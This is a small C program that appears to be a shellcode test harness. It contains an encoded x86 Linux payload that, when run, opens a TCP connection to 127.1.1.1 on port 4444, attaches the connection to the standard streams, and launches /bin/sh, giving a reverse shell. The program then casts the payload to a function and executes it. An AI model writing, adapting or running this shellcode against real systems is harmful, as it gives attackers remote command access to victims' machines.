#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\xb0\x66\x6a\x01\x5b\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x50\x5e\xb0\x66\x5b\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x87\xde\x31\xc0\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
